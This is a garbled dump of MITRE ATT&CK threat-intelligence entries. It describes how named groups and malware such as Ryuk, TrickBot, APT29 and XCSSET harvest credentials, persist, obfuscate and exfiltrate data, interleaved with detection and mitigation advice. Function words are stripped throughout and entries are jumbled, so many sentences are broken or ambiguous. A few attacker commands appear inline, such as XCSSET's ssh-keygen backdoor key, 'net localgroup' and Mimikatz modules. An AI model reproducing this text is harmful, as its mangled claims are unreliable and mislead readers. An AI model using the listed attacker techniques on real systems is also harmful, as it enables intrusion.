Hours October 2020)(Citation: Sophos Ryuk Attack October 2020)(Citation: Red Canary Hospital Thwarted Ryuk October 2020) [ZxxZ](https://attack.mitre.org/software/S1013) scheduled tasks persistence execution.(Citation: Cisco Talos Bitter Bangladesh 2022) Monitor newly executed processes establish persistence executing malicious content triggered interrupt signal. [Cuba](https://attack.mitre.org/software/S0625) loaded payload memory PowerShell.(Citation: McAfee Cuba April 2021)  [GRIFFON](https://attack.mitre.org/software/S0417) written executed [JavaScript](https://attack.mitre.org/techniques/T1059/007).(Citation: SecureList Griffon 2019)	 [Carbanak](https://attack.mitre.org/groups/G0008) actors legitimate credentials banking employees perform operations millions dollars.(Citation: Kaspersky Carbanak) [OSX_OCEANLOTUS.D](https://attack.mitre.org/software/S0352) collects processor information, memory information, name, hardware UUID, serial number, operating version. [OSX_OCEANLOTUS.D](https://attack.mitre.org/software/S0352) <code>ioreg</code> command gather information.(Citation: TrendMicro MacOS April 2018)(Citation: Trend Micro MacOS Backdoor November 2020)(Citation: 20 macOS Common Tools Techniques) [BackdoorDiplomacy](https://attack.mitre.org/groups/G0135) dropped legitimate software compromised host execute malicious DLLs.(Citation: ESET BackdoorDiplomacy Jun 2021) Restrict software installation trusted repositories cautious orphaned software packages. [Kimsuky](https://attack.mitre.org/groups/G0094) proprietary tool intercept time passwords required two-factor authentication.(Citation: KISA Operation Muzabi) [APT39](https://attack.mitre.org/groups/G0087) malware delete files deployed compromised host.(Citation: FBI FLASH APT39 September 2020) [GOLD SOUTHFIELD](https://attack.mitre.org/groups/G0115) cloud-based remote management monitoring tool "ConnectWise Control" deploy [REvil](https://attack.mitre.org/software/S0496).(Citation: Tetra Defense Sodinokibi March 2020) [Tropic Trooper](https://attack.mitre.org/groups/G0081) <code>letmein</code> scan saved usernames target system.(Citation: TrendMicro TropicTrooper 2015) Monitor firmware. (Citation: MITRE Trustworthy Firmware Measurement) Dump inspect BIOS images vulnerable systems compare images. (Citation: MITRE Copernicus) Analyze differences determine malicious occurred. Log attempts read/write BIOS compare patching behavior.
Likewise, EFI modules collected compared known-clean list EFI executable binaries detect malicious modules. CHIPSEC framework analysis determine firmware modifications performed. (Citation: McAfee CHIPSEC Blog) (Citation: Github CHIPSEC) (Citation: Intel HackingTeam UEFI Rootkit) Disallow remote access webroot directories serve content. [Lizar](https://attack.mitre.org/software/S0681) [Mimikatz](https://attack.mitre.org/software/S0002) harvest credentials.(Citation: Threatpost Lizar 2021)(Citation: BiZone Lizar 2021)  [Empire](https://attack.mitre.org/software/S0363) acquire local domain user account information.(Citation: Github PowerShell Empire)(Citation: SecureWorks August 2019) [Mosquito](https://attack.mitre.org/software/S0256) launch PowerShell Scripts.(Citation: ESET Turla Mosquito Jan 2018) Monitor API calls altering data. Remote access tools built-in features interact Windows API gather information. Monitor executed commands arguments delete alter generated artifacts host system, including logs captured files quarantined malware. Monitor executed commands arguments sdbinst.exe potential indications application shim abuse. [FIN7](https://attack.mitre.org/groups/G0046) RDP laterally victim environments.(Citation: CrowdStrike Carbon Spider August 2021)
 MDM disable user's ability install approve kernel extensions, ensure approved kernel extensions alignment policies <code>com.apple.syspolicy.kernel-extension-policy</code>.(Citation: Apple TN2459 Kernel Extensions)(Citation: MDMProfileConfigMacOS)
 Monitor anomalous creation scheduled jobs container orchestration environments. [Sandworm Team](https://attack.mitre.org/groups/G0034) MS-SQL stored procedures.(Citation: Dragos Crashoverride 2018) 
 [Psylo](https://attack.mitre.org/software/S0078) HTTPS C2.(Citation: Scarlet Mimic Jan 2016) [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) malware C2.(Citation: Secureworks BRONZE BUTLER Oct 2017) [AppleSeed](https://attack.mitre.org/software/S0622) <code>GetKeyState</code> <code>GetKeyboardState</code> capture keystrokes victim’s machine.(Citation: Malwarebytes Kimsuky June 2021)(Citation: KISA Operation Muzabi) [Threat Group-3390](https://attack.mitre.org/groups/G0027) `whoami` collect user information.(Citation: Trend Micro DRBControl February 2020) [Sandworm Team](https://attack.mitre.org/groups/G0034) acquired open-source tools operations; acquired [Invoke-PSImage](https://attack.mitre.org/software/S0231) establish encrypted channel compromised host [Sandworm Team](https://attack.mitre.org/groups/G0034)'s C2 server preparation 2018 Winter Olympics attack.(Citation: District Court Indictment GRU Unit 74455 October 2020) [certutil](https://attack.mitre.org/software/S0160) decode binaries hidden certificate files Base64 information.(Citation: Malwarebytes Targeted Attack Saudi Arabia) [InvisiMole](https://attack.mitre.org/software/S0260) determines directory stores gathered data compromised machine.(Citation: ESET InvisiMole June 2018)(Citation: ESET InvisiMole June 2020) Monitor executed commands arguments hijack legitimate user's SSH session laterally environment. (Citation: NCC APT15 Alive Strong) [DDKONG](https://attack.mitre.org/software/S0255) Rundll32 ensure single instance running once.(Citation: Rancor Unit42 June 2018) [Rover](https://attack.mitre.org/software/S0090) automatically searches files local drives based predefined list file extensions sends command control server 60 minutes. [Rover](https://attack.mitre.org/software/S0090) automatically sends keylogger files screenshots C2 server regular timeframe.(Citation: Palo Alto Rover) [Indrik Spider](https://attack.mitre.org/groups/G0119) stored collected .tmp file.(Citation: Symantec WastedLocker June 2020) [Tropic Trooper](https://attack.mitre.org/groups/G0081) <code>pr</code> openly tool scan ports target systems.(Citation: TrendMicro TropicTrooper 2015)(Citation: TrendMicro Tropic Trooper 2020) [Naikon](https://attack.mitre.org/groups/G0019) LadonGo scanner scan target networks.(Citation: Bitdefender Naikon April 2021) [KONNI](https://attack.mitre.org/software/S0356) feature steal data clipboard.(Citation: Talos Konni 2017) Monitor newly executed processes gather attempt calculate geographical location victim host. [Ember Bear](https://attack.mitre.org/groups/G1003) control panel files (CPL), delivered e-mail, execution.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) [Remexi](https://attack.mitre.org/software/S0375) collects clipboard.(Citation: Securelist Remexi Jan 2019) [FoggyWeb](https://attack.mitre.org/software/S0661) XOR-encoded.(Citation: MSTIC FoggyWeb September 2021) Monitor windows registry key values unexpected modifications <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList</code> key. [Carbanak](https://attack.mitre.org/software/S0030) downloads executable injects process.(Citation: FireEye CARBANAK June 2017) [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) exfiltrated files stolen file shares.(Citation: Secureworks BRONZE BUTLER Oct 2017) [C0015](https://attack.mitre.org/campaigns/C0015), threat actors command `net localgroup "adminstrator" ` identify accounts local administrator rights.(Citation: DFIR Conti Bazar Nov 2021) [SMOKEDHAM](https://attack.mitre.org/software/S0649) relied users clicking malicious link delivered phishing.(Citation: FireEye Shining Light DARKSIDE 2021) [macOS.OSAMiner](https://attack.mitre.org/software/S1048) run-only Applescripts, compiled stripped version [AppleScript](https://attack.mitre.org/techniques/T1059/002), remove human readable indicators evade detection.(Citation: SentinelLabs reversing run-only applescripts 2021) [Kazuar](https://attack.mitre.org/software/S0265) encodes communications C2 server Base64.(Citation: Unit 42 Kazuar 2017) [Tomiris](https://attack.mitre.org/software/S0671) ability sleep minutes evade sandbox-based analysis systems.(Citation: Kaspersky Tomiris Sep 2021) [Seasalt](https://attack.mitre.org/software/S0345) masqueraded service called "SaSaut" display "System Authorization Service" apparent attempt masquerade legitimate service.(Citation: Mandiant APT1 Appendix) Monitor newly executed processes account creation, net.exe  [Naikon](https://attack.mitre.org/groups/G0019) WMIC.exe lateral movement.(Citation: Bitdefender Naikon April 2021) (Citation: Rancor Unit42 June 2018) Monitor module loads Terminal Services process (ex: <code>svchost.exe -k termsvcs</code>) unexpected DLLs (the default <code>%SystemRoot%\System32\termsrv.dll</code>, adversary [Match Legitimate Location](https://attack.mitre.org/techniques/T1036/005) conceal malicious payload). [REvil](https://attack.mitre.org/software/S0496) identify username, machine name, language, keyboard layout, OS version, drive compromised host.(Citation: Kaspersky Sodin July 2019)(Citation: Cylance Sodinokibi July 2019)(Citation: Secureworks GandCrab REvil September 2019)(Citation: McAfee Sodinokibi October 2019)(Citation: McAfee Sodinokibi October 2019)(Citation: Intel 471 REvil March 2020)(Citation: IB Ransomware 2020)(Citation: Secureworks REvil September 2019) [APT3](https://attack.mitre.org/groups/G0022) spearphishing emails malicious links.(Citation: FireEye Clandestine Wolf) [Donut](https://attack.mitre.org/software/S0695) includes subprojects enumerate identify [Process Injection](https://attack.mitre.org/techniques/T1055) candidates.(Citation: Donut Github)	 Monitor newly constructed files deface systems internal organization attempt intimidate mislead users. Refer NIST guidelines creating password policies. (Citation: NIST 800-63-3) Monitor processes viewed inject code processes evade process-based defenses elevate privileges. [GravityRAT](https://attack.mitre.org/software/S0237) WMI check BIOS manufacturer strings "VMWare", "Virtual", "XEN" WMI request current temperature hardware determine virtual machine environment. (Citation: Talos GravityRAT) [Leafminer](https://attack.mitre.org/groups/G0077) tools retrieving login password information, including LaZagne.(Citation: Symantec Leafminer July 2018) [Cadelspy](https://attack.mitre.org/software/S0454) ability compress stolen data .cab file.(Citation: Symantec Chafer Dec 2015) [BBSRAT](https://attack.mitre.org/software/S0127) start, stop, delete services.(Citation: Palo Alto Networks BBSRAT) [FIN4](https://attack.mitre.org/groups/G0085) lured victims launch malicious attachments delivered spearphishing emails (often compromised accounts).(Citation: FireEye Hacking FIN4 Dec 2014)(Citation: FireEye Hacking FIN4 Video Dec 2014) [Egregor](https://attack.mitre.org/software/S0554) collect files enumerated drivers sending C2 channel.(Citation: NHS Digital Egregor Nov 2020)  Train users suspicious certificate errors. Adversaries certificates attempt intercept HTTPS traffic. Certificate errors application’s certificate match expected host. [LiteDuke](https://attack.mitre.org/software/S0513) query Registry check presence <code>HKCU\Software\KasperskyLab</code>.(Citation: ESET Dukes October 2019) [Cobalt Strike](https://attack.mitre.org/software/S0154) install service.(Citation: Cobalt Strike TTPs Dec 2017) [Conti](https://attack.mitre.org/software/S0575) 146 Windows services security, backup, database, email solutions <code>net stop</code>.(Citation: CarbonBlack Conti July 2020) [APT19](https://attack.mitre.org/groups/G0073) Base64 obfuscate commands payload.(Citation: FireEye APT19) [Ferocious Kitten](https://attack.mitre.org/groups/G0137) named malicious files <code>update.exe</code> loaded compromise host's “Public” folder.(Citation: Kaspersky Ferocious Kitten Jun 2021) [Pisloader](https://attack.mitre.org/software/S0124) DNS C2 protocol.(Citation: Palo Alto DNS Requests) [Frankenstein](https://attack.mitre.org/campaigns/C0001), threat actors Word documents prompted victim enable macros Visual Basic script.(Citation: Talos Frankenstein June 2019) [Shamoon](https://attack.mitre.org/software/S0140) base64-encoded strings.(Citation: Palo Alto Shamoon Nov 2016) adversaries leverage service infrastructure (ex: command control), unique characteristics adversary software, known.(Citation: ThreatConnect Infrastructure Dec 2020) activity visibility target organization, detection behavior difficult. Detection efforts focused stages adversary lifecycle, Command Control ([Web Service](https://attack.mitre.org/techniques/T1102)) [Exfiltration Service](https://attack.mitre.org/techniques/T1567). Monitor executed commands arguments actions gather tasks created Windows management tools Windows Management Instrumentation PowerShell, additional logging configured gather data. [SUGARDUMP](https://attack.mitre.org/software/S1042) named `CrashReporter.exe` legitimate Mozilla executable.(Citation: Mandiant UNC3890 Aug 2022) Monitor analyze traffic patterns packet inspection protocol(s), leveraging SSL/TLS inspection encrypted traffic, follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [KGH_SPY](https://attack.mitre.org/software/S0526) ability steal data Chrome, Edge, Firefox, Thunderbird, Opera browsers.(Citation: Cybereason Kimsuky November 2020) [TA551](https://attack.mitre.org/groups/G0127) hidden encoded data malware DLLs PNG.(Citation: Unit 42 TA551 Jan 2021) Users trained identify social engineering techniques spearphishing attempts. Additionally, users perform visual checks domains visit; however, homographs ASCII IDN domains render manual checks difficult. Phishing training cybersecurity training raise awareness check URLs visiting sites. [PoshC2](https://attack.mitre.org/software/S0378) modules, <code>Get-ComputerInfo</code>, enumerating common information.(Citation: GitHub PoshC2) Monitor DLL/PE file events, creation binary files loading DLLs processes. DLLs recognized loaded process. [Lazarus Group](https://attack.mitre.org/groups/G0032) exploited Adobe Flash vulnerability CVE-2018-4878 execution.(Citation: McAfee Bankshot) [Get2](https://attack.mitre.org/software/S0460) ability inject DLLs processes.(Citation: Proofpoint TA505 October 2019) [Cobalt Strike](https://attack.mitre.org/software/S0154) VBA perform execution.(Citation: Cobalt Strike TTPs Dec 2017)(Citation: CobaltStrike Daddy 2017)(Citation: Talos Cobalt Strike September 2020) [PUNCHBUGGY](https://attack.mitre.org/software/S0196) mimics filenames %SYSTEM%\System32 hide DLLs %WINDIR% %TEMP%.(Citation: FireEye Enemy FIN8 Aug 2016)(Citation: Morphisec ShellTea June 2019) Monitor Active Directory network logon scripts automatically executed logon initialization establish persistence. [Sliver](https://attack.mitre.org/software/S0633) ability manipulate user tokens targeted Windows systems.(Citation: Bishop Fox Sliver Framework August 2019)(Citation: GitHub Sliver C2) [MacSpy](https://attack.mitre.org/software/S0282) steal clipboard contents.(Citation: objsee mac malware 2017) [Wizard Spider](https://attack.mitre.org/groups/G0102) Base64 encoding obfuscate [Empire](https://attack.mitre.org/software/S0363) service PowerShell commands.(Citation: FireEye Ryuk Trickbot January 2019)(Citation: DFIR Ryuk's Return October 2020) [FIN8](https://attack.mitre.org/groups/G0061) emails malicious links lure victims installing malware.(Citation: FireEye Obfuscation June 2017)(Citation: FireEye Fin8 2016)(Citation: FireEye Enemy FIN8 Aug 2016) [Trojan.Karagany](https://attack.mitre.org/software/S0094) capture victim's OS, security, hardware configuration.(Citation: Secureworks Karagany July 2019) [APT12](https://attack.mitre.org/groups/G0005) blogs WordPress C2 infrastructure.(Citation: Meyers Numbered Panda) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [HiddenWasp](https://attack.mitre.org/software/S0394) adds shared object LD_PRELOAD environment variable.(Citation: Intezer HiddenWasp Map 2019) Monitor deletion generated artifacts host system, including logs captured files quarantined emails. 

On Windows 10, mail application data stored <code>C:\Users\Username\AppData\Local\Comms\Unistore\data</code>. Linux, mail data stored <code>/var/spool/mail</code> <code>/var/mail</code>. macOS, mail data stored <code>~/Library/Mail</code>. [Hancitor](https://attack.mitre.org/software/S0499) PowerShell execute commands.(Citation: FireEye Hancitor) [Metamorfo](https://attack.mitre.org/software/S0455) displayed fake forms banking sites intercept credentials victims.(Citation: FireEye Metamorfo Apr 2018)  remove PowerShell systems needed, review performed assess impact environment, legitimate purposes administrative functions.

Disable/restrict WinRM Service prevent PowerShell remote execution. [Mythic](https://attack.mitre.org/software/S0699) leverage peer-to-peer C2 profile agents.(Citation: Mythc Documentation)		 Monitor user accounts logged systems RDP (ex: Windows EID 4624 Logon Type 10). factors, access patterns (ex: multiple systems short period time) activity occurs remote login, suspicious malicious behavior RDP. Monitor requests ticket granting ticket service tickets Domain Controller. Windows Security events 4768 (A Kerberos authentication ticket (TGT) requested) 4769 (A Kerberos service ticket requested) combined logon session creation indicative overpass hash attempt. Monitor investigate attempts modify ACLs file/directory ownership. enabling file/directory permission change auditing folders key binary/configuration files. [menuPass](https://attack.mitre.org/groups/G0045) administration tool csvde.exe export Active Directory data.(Citation: PWC Cloud Hopper Technical Annex April 2017) Ensure proper permissions directory access control set deny users ability write files top-level directory <code>C:</code> directories, <code>C:\Windows\</code>, reduce malicious files execution. Require executables write-protected directories. Odbcconf.exe environment. [CreepyDrive](https://attack.mitre.org/software/S1023) OneDrive C2.(Citation: POLONIUM June 2022) [Sandworm Team](https://attack.mitre.org/groups/G0034) leased servers resellers leasing infrastructure hosting companies enable operations.(Citation: District Court Indictment GRU Unit 74455 October 2020) [gh0st RAT](https://attack.mitre.org/software/S0032) variant rundll32 execution.(Citation: Arbor Musical Chairs Feb 2018) [BLACKCOFFEE](https://attack.mitre.org/software/S0069) capability discover processes.(Citation: FireEye APT17) [Ryuk](https://attack.mitre.org/software/S0446) <code>cmd.exe</code> create Registry entry establish persistence.(Citation: CrowdStrike Ryuk January 2019) [Exaramel Linux](https://attack.mitre.org/software/S0401) hardcoded location achieve persistence startup Upstart running root.(Citation: ANSSI Sandworm January 2021) (Citation: Cybereason Kimsuky November 2020) [LAPSUS$](https://attack.mitre.org/groups/G1004) acquired Redline password stealer operations.(Citation: MSTIC DEV-0537 Mar 2022) [OSX_OCEANLOTUS.D](https://attack.mitre.org/software/S0352) create persistence file folder <code>/Library/LaunchAgents</code>.(Citation: TrendMicro MacOS April 2018)(Citation: Trend Micro MacOS Backdoor November 2020) [DarkVishnya](https://attack.mitre.org/groups/G0105) brute-force attack login data.(Citation: Securelist DarkVishnya Dec 2018) [Molerats](https://attack.mitre.org/groups/G0021) phishing emails malicious Word PDF attachments.(Citation: Kaspersky MoleRATs April 2019)(Citation: Unit42 Molerat Mar 2020)(Citation: Cybereason Molerats Dec 2020) [TA505](https://attack.mitre.org/groups/G0092) VBS code execution.(Citation: Proofpoint TA505 Sep 2017)(Citation: Proofpoint TA505 June 2018)(Citation: Trend Micro TA505 June 2019)(Citation: IBM TA505 April 2020) [Aria-body](https://attack.mitre.org/software/S0456) ability identify titles running windows compromised host.(Citation: CheckPoint Naikon 2020) [Mivast](https://attack.mitre.org/software/S0080) creates Registry entry: <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Micromedia</code>.(Citation: Symantec Backdoor.Mivast) [SeaDuke](https://attack.mitre.org/software/S0053) capable uploading downloading files.(Citation: Unit 42 SeaDuke 2015) [MuddyWater](https://attack.mitre.org/groups/G0069) malware execute PowerShell scripts DDE.(Citation: Securelist MuddyWater Oct 2018) [Bad Rabbit](https://attack.mitre.org/software/S0606) spread watering holes popular sites injecting JavaScript body <code>.js</code> file.(Citation: ESET Bad Rabbit)(Citation: Secure List Bad Rabbit) [Volgmer](https://attack.mitre.org/software/S0180) simple XOR cipher encrypt traffic files.(Citation: US-CERT Volgmer 2 Nov 2017) Monitor cloud logs API calls unusual activity cloud instance enumeration. Discovery techniques occur operation adversary learns environment. Data events viewed isolation, chain behavior lead activities, Collection Exfiltration, based obtained. [ZxShell](https://attack.mitre.org/software/S0412) query netsvc data located svchost Registry key.(Citation: Talos ZxShell Oct 2014)  [Grandoreiro](https://attack.mitre.org/software/S0531) identify installed security tools based window names.(Citation: ESET Grandoreiro April 2020) [Dark Caracal](https://attack.mitre.org/groups/G0070) leveraged watering hole serve malicious code.(Citation: Lookout Dark Caracal Jan 2018) [BLUELIGHT](https://attack.mitre.org/software/S0657) collect list anti-virus products installed machine.(Citation: Volexity InkySquid BLUELIGHT August 2021) [TrickBot](https://attack.mitre.org/software/S0266) leverages custom packer obfuscate functionality.(Citation: S2 Grupo TrickBot June 2017) [C0015](https://attack.mitre.org/campaigns/C0015), threat actors `tasklist /s` command `taskmanager` list running processes.(Citation: DFIR Conti Bazar Nov 2021) [Cobalt Group](https://attack.mitre.org/groups/G0080) emails malicious attachments require users execute file macro infect victim machine.(Citation: Talos Cobalt July 2018)(Citation: Unit 42 Cobalt Gang Oct 2018) [Wevtutil](https://attack.mitre.org/software/S0645) disable specific event logs system.(Citation: Wevtutil Documentation) [Empire](https://attack.mitre.org/software/S0363) enumerate Security Support Providers (SSPs) utilize [PowerSploit](https://attack.mitre.org/software/S0194)'s <code>Install-SSP</code> <code>Invoke-Mimikatz</code> install malicious SSPs log authentication events.(Citation: Github PowerShell Empire) [KOCTOPUS](https://attack.mitre.org/software/S0669) <code>-WindowsStyle Hidden</code> hide command window.(Citation: MalwareBytes LazyScripter Feb 2021) [Inception](https://attack.mitre.org/groups/G0100) PowerShell execute malicious commands payloads.(Citation: Unit 42 Inception November 2018)(Citation: Kaspersky Cloud Atlas December 2014) [H1N1](https://attack.mitre.org/software/S0132) functionality removable media.(Citation: Cisco H1N1 2) (Citation: Cybereason Soft Cell June 2019) [Milan](https://attack.mitre.org/software/S1015) component generate scheduled tasks.(Citation: ClearSky Siamesekitten August 2021) [BlackEnergy](https://attack.mitre.org/software/S0089) gathered local network connections [netstat](https://attack.mitre.org/software/S0104).(Citation: F-Secure BlackEnergy 2014)(Citation: Securelist BlackEnergy Nov 2014) Disable Autorun unnecessary. (Citation: Disable Autorun) Disallow restrict removable media organizational policy level required business operations. (Citation: TechNet Removable Media Control) [TrickBot](https://attack.mitre.org/software/S0266) passwords stored files applications Outlook, Filezilla, OpenSSH, OpenVPN WinSCP.(Citation: Trend Micro Trickbot Nov 2018)(Citation: Cyberreason Anchor December 2019) Additionally, searches ".vnc.lnk" affix steal VNC credentials.(Citation: TrendMicro Trickbot Feb 2019) [Avaddon](https://attack.mitre.org/software/S0640) collected running processes.(Citation: Arxiv Avaddon Feb 2021) process monitoring monitor execution arguments mshta.exe. [httpclient](https://attack.mitre.org/software/S0068) encrypts C2 content XOR single byte, 0x12.(Citation: CrowdStrike Putter Panda) [NavRAT](https://attack.mitre.org/software/S0247) download files remotely.(Citation: Talos NavRAT 2018) [QuietSieve](https://attack.mitre.org/software/S0686) check C2 connectivity `ping` 8.8.8.8 (Google public DNS).(Citation: Actinium February 2022) [SUGARDUMP](https://attack.mitre.org/software/S1042) stored collected data `%<malware_execution_folder>%\\CrashLog.txt`.(Citation: Mandiant UNC3890 Aug 2022) (Citation: Symantec Buckeye) [KONNI](https://attack.mitre.org/software/S0356) pretended xmlProv Network Provisioning service.(Citation: Malwarebytes Konni Aug 2021)  [ROADTools](https://attack.mitre.org/software/S0684) enumerate Azure groups.(Citation: Roadtools)	 [Ebury](https://attack.mitre.org/software/S0377) intercept private trojanized <code>ssh-add</code> function.(Citation: ESET Ebury Feb 2014) [OSX/Shlayer](https://attack.mitre.org/software/S0402) install malicious Safari browser extensions serve ads.(Citation: Intego Shlayer Apr 2018)(Citation: Malwarebytes Crossrider Apr 2018) (Citation: FireEye Fin8 2016) [Ember Bear](https://attack.mitre.org/groups/G1003) exploited Office vulnerability CVE-2017-11882.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) [Cuba](https://attack.mitre.org/software/S0625) dropped systems lateral movement obfuscated PowerShell scripts.(Citation: McAfee Cuba April 2021) [Patchwork](https://attack.mitre.org/groups/G0040) spearphishing attachment deliver files exploits initial victims.(Citation: Cymmetria Patchwork)(Citation: Securelist Dropping Elephant)(Citation: TrendMicro Patchwork Dec 2017)(Citation: Volexity Patchwork June 2018) (Citation: ClearSky Lebanese Cedar Jan 2021)(Citation: CheckPoint Volatile Cedar March 2015) [USBStealer](https://attack.mitre.org/software/S0136) registers Registry key "USB Disk Security."(Citation: ESET Sednit USBStealer 2014) version [Helminth](https://attack.mitre.org/software/S0170) PowerShell script.(Citation: Palo Alto OilRig 2016) [Operation Honeybee](https://attack.mitre.org/campaigns/C0006), threat actors deployed MaoCheng dropper stolen Adobe Systems digital signature.(Citation: McAfee Honeybee) [XCSSET](https://attack.mitre.org/software/S0658) create ssh key <code>ssh-keygen -t rsa -f $HOME/.ssh/id_rsa -P</code> command. [XCSSET](https://attack.mitre.org/software/S0658) upload private key file server remotely access host password.(Citation: trendmicro xcsset xcode project 2020)  Monitor processes inject malicious code suspended hollowed processes evade process-based defenses. [BadPatch](https://attack.mitre.org/software/S0337) searches files specific file extensions.(Citation: Unit 42 BadPatch Oct 2017) Monitor newly constructed network activity generated BITS. BITS jobs HTTP(S) SMB remote connections tethered creating user function user logged (this rule applies user attaches job service account). [APT39](https://attack.mitre.org/groups/G0087) communicated C2 files uploaded downloaded DropBox.(Citation: BitDefender Chafer 2020) Detection Endpoint DoS achieved sufficient impact availability service, response time typically requires aggressive monitoring responsiveness. Monitor logging, messaging, artifacts highlighting health host sensors (ex: metrics, errors, exceptions logging applications) (Citation: Security Intelligence Eggs Aug 2019)(Citation: Visa FIN6 Feb 2019) [Avaddon](https://attack.mitre.org/software/S0640) deletes backups shadow copies native tools.(Citation: Hornet Security Avaddon June 2020)(Citation: Arxiv Avaddon Feb 2021) [WindTail](https://attack.mitre.org/software/S0466) ability C2 communications.(Citation: objective-see windtail2 jan 2019) [Taidoor](https://attack.mitre.org/software/S0011) stream cipher decrypt stings malware.(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021) Ensure event tracers/forwarders (Citation: ETW 2018), firewall policies, mechanisms secured permissions access controls. Detection file obfuscation difficult artifacts left obfuscation process uniquely detectable signature. detection obfuscation possible, detect malicious activity caused obfuscated file (for example, method write, read, modify file file system). [MechaFlounder](https://attack.mitre.org/software/S0459) ability communication C2.(Citation: Unit 42 MechaFlounder March 2019) [Darkhotel](https://attack.mitre.org/groups/G0012)'s selective infector modifies executables stored removable media method spreading computers.(Citation: Kaspersky Darkhotel) [Helminth](https://attack.mitre.org/software/S0170) [Tasklist](https://attack.mitre.org/software/S0057) processes.(Citation: Unit 42 Playbook Dec 2017) [Octopus](https://attack.mitre.org/software/S0340) disguised legitimate programs, Java Telegram Messenger.(Citation: Securelist Octopus Oct 2018)(Citation: ESET Nomadic Octopus 2018) [NETEAGLE](https://attack.mitre.org/software/S0034) adversaries enumerate modify infected host's file system. supports searching directories, creating directories, listing directory contents, reading writing files, retrieving file attributes, retrieving volume information.(Citation: FireEye APT30) [Agent Tesla](https://attack.mitre.org/software/S0331) ability form-grabbing extract data data forms.(Citation: Bitdefender Agent Tesla April 2020) [PLAINTEE](https://attack.mitre.org/software/S0254) <code>reg add</code> add Registry key persistence.(Citation: Rancor Unit42 June 2018) (Citation: FireEye APT40 March 2019) [APT32](https://attack.mitre.org/groups/G0050) malicious links direct users designed harvest credentials.(Citation: Volexity Ocean Lotus November 2020) [Bumblebee](https://attack.mitre.org/software/S1039) asynchronous procedure (APC) injection execute commands received C2.(Citation: Proofpoint Bumblebee April 2022) [APT29](https://attack.mitre.org/groups/G0016) embedded ISO file attachment contained JavaScript code initiate malware execution.(Citation: ESET T3 Threat Report 2021)  [APT1](https://attack.mitre.org/groups/G0006) spearphishing emails hyperlinks malicious files.(Citation: Mandiant APT1) [WarzoneRAT](https://attack.mitre.org/software/S0670) masquerade Process Environment Block compromised host hide attempts elevate privileges `IFileOperation`.(Citation: Check Warzone Feb 2020) [Egregor](https://attack.mitre.org/software/S0554) Windows API detection difficult.(Citation: Cyble Egregor Oct 2020)  [Cobalt Group](https://attack.mitre.org/groups/G0080) exploits increase levels rights privileges.(Citation: IB Cobalt Aug 2017) [Winnti Windows](https://attack.mitre.org/software/S0141) add service named <code>wind0ws</code> Registry achieve persistence reboot.(Citation: Novetta Winnti April 2015) [Rising Sun](https://attack.mitre.org/software/S0448) detect name, operating system, drive information, including drive type, total bytes disk, total bytes disk, volume.(Citation: McAfee Sharpshooter December 2018)	 [APT29](https://attack.mitre.org/groups/G0016) routinely removed tools, including custom backdoors, remote access achieved. [APT29](https://attack.mitre.org/groups/G0016) [SDelete](https://attack.mitre.org/software/S0195) remove artifacts victims.(Citation: FireEye SUNBURST Backdoor December 2020)(Citation: Mandiant Easy Breach) [StrongPity](https://attack.mitre.org/software/S0491) encrypted strings dropper component.(Citation: Talos Promethium June 2020)(Citation: Bitdefender StrongPity June 2020) [WellMail](https://attack.mitre.org/software/S0515) TCP C2 communications.(Citation: CISA WellMail July 2020) Monitor API calls search local sources, file systems local databases, files sensitive data prior Exfiltration.  [Threat Group-3390](https://attack.mitre.org/groups/G0027) hosted malicious payloads Dropbox.(Citation: Trend Micro DRBControl February 2020) [Chaes](https://attack.mitre.org/software/S0631) collected username UID infected machine.(Citation: Cybereason Chaes Nov 2020) [SILENTTRINITY](https://attack.mitre.org/software/S0692) inject shellcode Excel.exe specific process.(Citation: GitHub SILENTTRINITY Modules July 2019) (Citation: FireEye APT41 Aug 2019)(Citation: IB APT 41 June 2021) [SLOTHFULMEDIA](https://attack.mitre.org/software/S0533) named service establishes victim machines "TaskFrame" hide malicious purpose.(Citation: CISA MAR SLOTHFULMEDIA October 2020)  (Citation: Kaspersky Turla) [Linfo](https://attack.mitre.org/software/S0211) creates backdoor remote attackers download files compromised hosts.(Citation: Symantec Linfo 2012) [Clambling](https://attack.mitre.org/software/S0660) create start services compromised host.(Citation: Trend Micro DRBControl February 2020) [SysUpdate](https://attack.mitre.org/software/S0663) search files compromised host.(Citation: Trend Micro Iron Tiger April 2021) [TajMahal](https://attack.mitre.org/software/S0467) ability determine local time compromised host.(Citation: Kaspersky TajMahal April 2019) Limit USB devices removable media network. [Wizard Spider](https://attack.mitre.org/groups/G0102) file deletion remove modules configurations infected host use.(Citation: CrowdStrike Grim Spider 2019) [MuddyWater](https://attack.mitre.org/groups/G0069) Daniel Bohannon’s Invoke-Obfuscation framework obfuscated PowerShell scripts.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: GitHub Invoke-Obfuscation) obfuscation methods, including Base64 obfuscation VBScripts PowerShell commands.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: FireEye MuddyWater Mar 2018)(Citation: Securelist MuddyWater Oct 2018)(Citation: Talos MuddyWater 2019)(Citation: ClearSky MuddyWater June 2019)(Citation: Trend Micro Muddy Water March 2021)(Citation: Talos MuddyWater Jan 2022) [TinyTurla](https://attack.mitre.org/software/S0668) installed .bat file.(Citation: Talos TinyTurla September 2021) [Sakula](https://attack.mitre.org/software/S0074) DLL side-loading, typically digitally signed sample Kaspersky Anti-Virus (AV) 6.0 Windows Workstations McAfee's Outlook Scan Box load malicious DLL files.(Citation: Dell Sakula) [Kobalos](https://attack.mitre.org/software/S0641) replaced SSH client trojanized SSH client steal credentials compromised systems.(Citation: ESET Kobalos Jan 2021) Monitor queried domain (DNS) registry data compromise third-party DNS servers 